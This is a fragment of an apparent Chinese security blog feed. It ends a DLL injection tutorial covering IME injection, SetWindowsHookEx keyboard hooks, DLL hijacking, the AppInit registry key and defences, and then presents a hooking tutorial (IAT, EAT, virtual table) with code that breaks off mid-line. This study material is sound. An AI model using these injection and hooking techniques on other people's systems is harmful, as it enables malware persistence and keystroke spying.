title="系统机制"></a>系统机制</h1><h2 id="0x6-输入法注入"><a href="#0x6-输入法注入" class="headerlink" title="0x6 输入法注入"></a>0x6 输入法注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;切换输入法时候，<strong>输入法管理器imm32.dll就会加载IME模块，</strong>这样就形成了输入法注入的充要条件。而由于这个Ime文件本质上只是个存放在C:\WINDOWS\system32目录下的特殊的DLL文件，因此我们可以利用这个特性，在Ime文件中使用LoadLibrary()函数待注入的DLL文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先就是编写ime文件，至少需要两个导出函数<code>BOOL  ImeClass_Register(HINSTANCE hinstDLL)</code>，<code>BOOL WINAPI ImeInquire(LPIMEINFO lpIMEInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption)</code>这两个是必须要实现的。剩下的导出函数可以选择不去实现。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着编写注射器。利用ImmInstallIME安装ime文件，当输入法切换的时候就可以注入dll了。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallIME</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//获取当前默认的输入法</span></div><div class="line">SystemParametersInfo(SPI_GETDEFAULTINPUTLANG,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;m_retV,</div><div class="line"><span class="number">0</span>);</div><div class="line"><span class="comment">//安装输入法</span></div><div class="line">m_hImeFile32 = ImmInstallIME(<span class="string">"HookIme.ime"</span>,</div><div class="line"><span class="string">"我的输入法"</span>);</div><div class="line"><span class="comment">//是否安装成功</span></div><div class="line"><span class="keyword">if</span> (ImmIsIME(m_hImeFile32))</div><div class="line">&#123;</div><div class="line"><span class="comment">//设置默认输入法</span></div><div class="line">SystemParametersInfo(SPI_SETDEFAULTINPUTLANG,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;m_hImeFile32,</div><div class="line">SPIF_SENDWININICHANGE);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x7-SetWindowsHookEx"><a href="#0x7-SetWindowsHookEx" class="headerlink" title="0x7 SetWindowsHookEx"></a>0x7 SetWindowsHookEx</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我的理解是：windows维护着消息队列，应用程序会从队列中取出消息，不同的消息有着不同的编号，我们根据编号<code>idHook</code>，设置不同钩子。如何设置钩子？可以利用SetWindowsHookEx这个API函数,函数原型如下：第一个参数是消息编号，第二个参数为Hook函数<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">  <span class="keyword">int</span>       idHook,</span></span></div><div class="line"><span class="function"><span class="params">  HOOKPROC  lpfn,</span></span></div><div class="line"><span class="function"><span class="params">  HINSTANCE hmod,</span></span></div><div class="line"><span class="function"><span class="params">  DWORD     dwThreadId)</span></span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;具体操作如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//HHOOK hHook = NULL;</span></div><div class="line">g_hHook=SetWindowsHookEx(WH_KEYBOARD, HookProc, </div><div class="line">GetModuleHandle(<span class="string">"E://Viusal Studio//kanxue//注入技术//SetWindowsHookEx//Inject_dll//Debug//Inject_dll.dll"</span>), <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == g_hHook)</div><div class="line">&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">"安装钩子失败"</span>, <span class="string">"提示"</span>, MB_OKCANCEL);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="其他方法："><a href="#其他方法：" class="headerlink" title="其他方法："></a>其他方法：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL劫持法(输入表DLL替换法)，原理是利用搜索DLL路径存在先后顺序(exe程序目录&gt;系统目录&gt;当前目录&gt;Path),当较高层存在一个同名的DLL文件的时候，就会直接加载较高层的DLL文件。常常用于病毒的白加黑。需要注意的是黑DLL路径优先级一定要高于原来的dll文件，第二，一定要具有源dll文件所有的导出函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;毕竟新创建的进程在加载User32.dll时，都会自动调用LoadLibrary去加载注册表中某个表项键值里写入的Dll路径</p><ul><li><code>x64下:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code></li><li><code>x86下：HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code></li></ul><h1 id="应用级防护"><a href="#应用级防护" class="headerlink" title="应用级防护"></a>应用级防护</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>在创建远程线程创建初期</strong>在DllMain中防御远程线程，此时尚未调用LoadLibrary。可以对线程的合法性判断<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>LoadLibrary之前</strong>首先可以挂钩LoadLibrary函数，然后检查dll路径合法性<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>LoadLibrary之后</strong>枚举可疑内存和模块</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这是&amp;lt;一篇文章带你…&amp;gt;系列的第四篇，主要会阐明DLL注入的基本原理和几种主流方式，虽然这些方法已经有点滞后了。但是DLL注入的基本原理是不会改变的。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DLL注入的主要原理就是强制进程自己将需要注入的dll文件注入到自身进程空间内，最好配合Hook技术。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Dll注入可以从三个方向入手：第一：在进程创建初期按照导入表加载dll的时候。第二：进程运行时期利用LoadLibrary函数加载，第三：利用某些系统机制：例如windows消息机制等。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你理解HOOK技术</title>
    <link href="https://findream.github.io/2019/04/18/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3HOOK%E6%8A%80%E6%9C%AF/"/>
    <id>https://findream.github.io/2019/04/18/一篇文章带你理解HOOK技术/</id>
    <published>2019-04-18T07:02:11.000Z</published>
    <updated>2019-07-01T07:40:22.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.这是《一篇文章带你….》系列的第三篇，也是自己的学习总结，很多不懂的地方找的论坛前辈的资料。代码都是自己手敲，边敲边注释，对一些细节做了微调。前两篇是<a href="https://bbs.pediy.com/thread-251148.htm" target="_blank" rel="external">一篇文章带你学会Armadillo脱壳</a>和<a href="https://bbs.pediy.com/thread-250924.htm" target="_blank" rel="external">一篇文章带你理解PE三表 </a><br><a id="more"></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.几个驱动相关的HOOK，从代码层面上讲理解的不是很深刻。但是手敲了一边除了一些驱动相关的知识，HOOK原理上应该有所领悟。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.还是一样，不提供源码下载，驱动相关的HOOK，前辈们都写有源码。不作伸手党。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.想来想去，这篇文章已经停滞1个多月了，今天草草结笔。关于HOOK检测部分估计需要鸽了。有空再学习吧。看雪第四版有源码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.这篇文章是新瓶装旧酒，大佬别喷我。下一篇文章预计写注入，代码已经写完了，就剩下总结了，同样的还是新瓶装旧酒。旨在学习。下下一篇我也不知道写什么？加壳？花指令？？管他呢。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.唉，我什么时候才能成为像各位一样的大佬啊^_^</p><h1 id="0x1-AddressHook"><a href="#0x1-AddressHook" class="headerlink" title="0x1 AddressHook"></a>0x1 AddressHook</h1><h2 id="0x1-1-IAT-HOOK"><a href="#0x1-1-IAT-HOOK" class="headerlink" title="0x1.1 IAT_HOOK"></a>0x1.1 IAT_HOOK</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IAT是程序中存储导入函数地址的数据结构，如果HOOK了导入函数地址。就可以在函数调用的时候，将函数流程HOOK到我们指定的流程。但是我个人觉得这种方式最好要结合DLL注入的方式，如果单纯的使用HOOK，那么就需要将需要执行的操作的shellcode写入目标进程，如果操作复杂，可能需要的shellcode量特别大，<strong>所以我们需要借助DLL注入</strong>，这样就将我们需要执行的代码写入进程内部，在HOOK的Detour函数只需要实现LoadLibrary的操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IATHOOK的基本原理就是通过修改程序IAT数据结构，将原始调用API函数地址Target函数地址修改为Detour函数地址。所以IAT_HOOK需要实现以下几个步骤:</p><ul><li>构造Detour函数</li><li>获取Target函数地址</li><li>通过PE获取Target函数所在的IAT的地址</li><li>保存原始的IAT地址和IAT地址所存储的内容</li><li>修改IAT地址中的数据</li><li>如果需要调用原来API函数，可以直接使用保存的API地址，可以就保证了HOOK的有效性</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要构造Detour函数，为了堆栈平衡和一些其他原因，最好Detour函数的函数原型和Target函数原型保持一致。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef int(<span class="type">WINAPI</span> *<span class="type">PFN_MessageBoxA</span>)(<span class="type">HWND</span> hWnd, <span class="type">LPCTSTR</span> lpText, <span class="type">LPCTSTR</span> lpCaption, <span class="type">UINT</span> uType);</div><div class="line"><span class="title">int</span> <span class="type">WINAPI</span> <span class="type">My_MessageBoxA</span>(</div><div class="line"><span class="type">HWND</span> hWnd,</div><div class="line"><span class="type">LPCTSTR</span> lpText,</div><div class="line"><span class="type">LPCTSTR</span> lpCaption,</div><div class="line"><span class="type">UINT</span> uType</div><div class="line">)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个函数的内容可以任意设置，主要执行两个方面的操作，<strong>一是执行我们想进行的操作，二是控制Target函数的返回值。</strong>为了简单期间，设置MessageBox作为HOOK，标志，MessageBox函数地址可以使用保存的API函数<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bReturn = OldMessageBox(<span class="literal">NULL</span>, <span class="string">"You Are Hooked"</span>, <span class="string">"Warning"</span>, MB_OK);</div><div class="line"><span class="comment">//2.你可以控制API函数的返回值</span></div><div class="line"><span class="built_in">BOOL</span> bReturn = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bReturn;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩是获取Target函数地址，这一步的目的是为了遍历IAT的时候比较IAT中所存储的Target函数地址。以便找到存放目标函数的IAT地址。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">||<span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></div><div class="line">ULONG_PTR TargetFunAddr = (ULONG_PTR)GetProcAddress(hModule, szFuncName);</div><div class="line">PULONG_PTR lpAddr = <span class="literal">NULL</span>;</div><div class="line">SIZE_T size = <span class="keyword">sizeof</span>(PULONG_PTR);</div><div class="line">||<span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">ULONG32  TargetFunAddr = (ULONG32)GetProcAddress(hModule, szFuncName);</div><div class="line">PULONG32 lpAddr = <span class="literal">NULL</span>;</div><div class="line">SIZE_T size = <span class="keyword">sizeof</span>(PULONG32);</div><div class="line">||<span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="comment">//MARKDOWN原因，不能以#开头，所以加个||符号，实际代码不存在||符号</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步是获取Target函数的IAT地址，首先需要获取导入表的RVA，这里可以使用函数<code>ImageDirectoryEntryToData</code>获取<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (<span class="name">PIMAGE_IMPORT_DESCRIPTOR</span>)ImageDirectoryEntryToData(<span class="name">hModToHook</span>,</div><div class="line">TRUE,</div><div class="line">IMAGE_DIRECTORY_ENTRY_IMPORT,</div><div class="line"><span class="symbol">&amp;ulSize</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PE装载器已经将PE文件载入内存，可以使用IAT获取函数地址，所以通过FirstThunk指向的IAT遍历Target函数。需要判断DLLNAME是否是Target函数所在的模块，也就是说需要确定IID,<strong>毕竟一个IID对应一个DLL</strong><br><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (pImportDescriptor-&gt;FirstThunk)</div><div class="line">&#123;</div><div class="line"><span class="comment">//存放DllName</span></div><div class="line">szModName = (<span class="built_in">char</span>*)((PBYTE)hModToHook + pImportDescriptor-&gt;Name);</div><div class="line">printf(<span class="string">"[*]Cur Module Name:%s\n"</span>, szModName);</div><div class="line"><span class="comment">//比较DLLName与目标DLL是否相同  使用stricmp函数是不区分大小写的</span></div><div class="line"><span class="keyword">if</span> (stricmp(szModName, szModuleName) != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">pImportDescriptor++;</div><div class="line"><span class="keyword">continue</span>;</div><div class="line">&#125;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;First指向的是一个IAT结构，存储的API函数地址。所以可以利用PIMAGE_THUNK_DATA(IAT)遍历Target函数。<strong>如果找到了最好保存修改的IAT地址和数据</strong>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">PIMAGE_THUNK_DATA pThunkData = (PIMAGE_THUNK_DATA)((BYTE*)hModToHook + pImportDescriptor-&gt;FirstThunk);</div><div class="line"><span class="keyword">while</span> (pThunkData-&gt;u1.Function)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> ((*lpAddr) == TargetFunAddr)</div><div class="line">&#123;</div><div class="line"><span class="comment">//保存数据，修改为Detour函数地址</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//最好保存一下</span></div><div class="line"><span class="keyword">if</span> (pThunkPointer != <span class="keyword">NULL</span>)   <span class="comment">//保存修改内存的地址</span></div><div class="line">&#123;</div><div class="line">*pThunkPointer = lpAddr;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (pOriginalFuncAddr != <span class="keyword">NULL</span>)   <span class="comment">//保存修改内存的数据，也就是Target函数的地址</span></div><div class="line">&#123;</div><div class="line">*pOriginalFuncAddr = *lpAddr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>这里我实现了X64和X86的兼容，但是在实现X86的时候，出现了内存访问异常在VirtuallProtest处，但是在debug模式下程序没奔溃，需要那位大佬可以解答一下</strong></p><h2 id="0x1-2-EAT-HOOK"><a href="#0x1-2-EAT-HOOK" class="headerlink" title="0x1.2 EAT_HOOK"></a>0x1.2 EAT_HOOK</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用EAT_HOOK需要注意一下两点：第一：EAT存储的是函数地址的偏移，<strong>所以在HOOK EAT的时候需要加上基地址</strong>，在写入EAT的时候，Detour地址需要减去BaseAddress。第二，EAT不对隐式链接起作用，<strong>只对显示链接起作用</strong>，也就是说对于那种<strong>GetProcAddress的那种调用</strong>起作用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EAT_HOOK的原理和IAT_HOOK类似，都是通过修改函数地址数据从而HOOK。EAT_HOOK，也需要进行以下步骤：</p><ul><li>1.获取Target函数在HookModule上的RVA</li><li>2.获取导出函数数组首地址</li><li>3.遍历查找Target函数RVA</li><li>4.切记在修改函数地址之前，需要保存EAT地址和原函数地址、</li><li>5.将Detour函数地址写入EAT</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是获取Target函数RVA，因为EAT存的是函数的RVA，所以，我们需要获取Target函数RVA<br><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.获取Target函数在HookModule上的RVA</span></div><div class="line">ULONG_PTR TargetFunAddr = NULL;</div><div class="line">TargetFunAddr = (ULONG_PTR)GetProcAddress(hModToHook, szFuncName);</div><div class="line">ULONG_PTR TargetFunRVA = NULL;</div><div class="line">TargetFunRVA = (ULONG_PTR)(TargetFunAddr - (ULONG_PTR)hModToHook);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩是获取导出函数数组首地址，在EAT-&gt;AddressOfFunctions可以获取导出函数地址数组AddressOfFunctions的首地址<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">PIMAGE_EXPORT_DIRECTORY pExportDir = NULL<span class="comment">;</span></div><div class="line">pExportDir = (<span class="name">PIMAGE_EXPORT_DIRECTORY</span>)ImageDirectoryEntryToData(<span class="name">hModToHook</span>,//BaseAddress</div><div class="line">TRUE,</div><div class="line">IMAGE_DIRECTORY_ENTRY_EXPORT,   //Type</div><div class="line"><span class="symbol">&amp;ulSize</span>)<span class="comment">;                       //接收数据的大小</span></div><div class="line">ULONG* FuncAddr = NULL<span class="comment">;</span></div><div class="line">FuncAddr = (<span class="name">ULONG*</span>)((<span class="name">BYTE*</span>)hModToHook + pExportDir-&gt;AddressOfFunctions)<span class="comment">;  //导出函数数组首地址</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步是在EAT在寻找Target函数的RVA<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (FuncAddr[i] == TargetFunRVA)</div><div class="line">&#123;</div><div class="line"><span class="comment">//修改内存保护属性</span></div><div class="line">DWORD OldProtect = <span class="literal">NULL</span>;</div><div class="line"><span class="keyword">if</span> (VirtualProtect(&amp;FuncAddr[i], <span class="keyword">sizeof</span>(ULONG*), PAGE_EXECUTE_READWRITE, &amp;OldProtect))</div><div class="line">&#123;</div><div class="line"><span class="comment">//修改保存数据</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步是保存EAT地址和Target函数RVA<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*pAddrPointer = (PULONG_PTR)&amp;FuncAddr<span class="string">[i]</span>;</div><div class="line">*pOriginalFuncAddr = FuncAddr<span class="string">[i]</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>EAT保存的是Target函数的RVA</strong>，这一定要记住。所以在写入Detour函数的时候，是需要减去BaseAddress的。<br><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//5.将Detour函数地址写入EAT</span></div><div class="line"><span class="comment">//因为EAT里面保存的是函数地址RVA值，所以在写入Detour函数地址需要减去BaseAddress</span></div><div class="line">FuncAddr[i] = (ULONG)((ULONG_PTR)DetourFunc-(ULONG_PTR)hModToHook);</div></pre></td></tr></table></figure></p><h2 id="0x1-3-VirtualFunctionHook"><a href="#0x1-3-VirtualFunctionHook" class="headerlink" title="0x1.3 VirtualFunctionHook"></a>0x1.3 VirtualFunctionHook</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C++虚函数存在的意义是为了方便使用多态性。在实现虚函数Hook的时候需要注意如下问题：1.在构建DetourFun函数的时候，一定要构造DetourClass，因为在调用虚函数的时候使用了Thiscall的函数调用约定，如果直接调用detourfun函数应该使用的标准调用约定，两者不统一，会出错。2.当使用Trampolinefun回调的时候，需要重新实例化一个TrampolineClass。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步：仍然是构造DetourClass类和TrampolineClass类<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//因为使用了This的调用方法，所以在Hook的时候同时需要创建DetourClass类，保证函数约定是一致的</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetourClass</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">DetourFun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrampolineClass</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">TrampolineFun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"TrampolineFun"</span>);</div><div class="line"><span class="keyword">return</span> a + b;</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line"><span class="comment">//此处构造DetourFun</span></div><div class="line"><span class="keyword">int</span> DetourClass::DetourFun(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</div><div class="line">&#123;</div><div class="line"><span class="comment">//此处执行自定义操作</span></div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">"Hooked"</span>, <span class="string">"warning"</span>, MB_OK);</div><div class="line"><span class="comment">//调用TrampolineFun，首先需要将TrampolineClass实例化</span></div><div class="line">TrampolineClass *pTrampoline = <span class="keyword">new</span> TrampolineClass;</div><div class="line"><span class="keyword">int</span> iRet = pTrampoline-&gt;TrampolineFun(a, b);</div><div class="line"><span class="keyword">delete</span> pTrampoline;</div><div class="line"><span class="keyword">return</span> iRet+<span class="number">10</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩：将Target函数地址保存在TableTrampoline虚表中，方便回调。这时候需要获取两个值，第一个TableTrampoline虚表，第二个TargetFun地址。由于TableTrampoline虚函数表在类的起始位置。所以类的地址就是虚函数表的地址，第二，TargetFun函数地址位于虚函数中，存储在类似于数组的结构，可以用其索引指向获取虚函数地址<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//获取虚表地址vfTableToHook</span></div><div class="line"><span class="keyword">base</span> <span class="keyword">base</span>;</div><div class="line">printf(<span class="string">"[*]pBase=0x%x\n"</span>, &amp;<span class="keyword">base</span>);</div><div class="line">ULONG_PTR *vfTableToHook = (ULONG_PTR*)*(ULONG_PTR*)&amp;<span class="keyword">base</span>;</div><div class="line"><span class="comment">//获取Trampoline虚表地址，用于回调</span></div><div class="line">ULONG_PTR *vfTableTrampoline = (ULONG_PTR*)*(ULONG_PTR*)&amp;Trampoline;</div><div class="line"><span class="comment">//第一次修改，用于保存原始的Target函数地址</span></div><div class="line"><span class="comment">//修改内存保护属性</span></div><div class="line">VirtualProtect(vfTableTrampoline, <span class="keyword">sizeof</span>(ULONG_PTR), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</div><div class="line">vfTableTrampoline[<span class="number">0</span>] = (ULONG_PTR)GetClassVirtualFnAddress(&amp;<span class="keyword">base</span>, <span class="number">0</span>);</div><div class="line">printf(<span class="string">"[*]vfTableTrampoline=0x%x\n"</span>, vfTableTrampoline[<span class="number">0</span>]);</div><div class="line">VirtualProtect(vfTableTrampoline, <span class="keyword">sizeof</span>(ULONG_PTR), dwOldProtect, 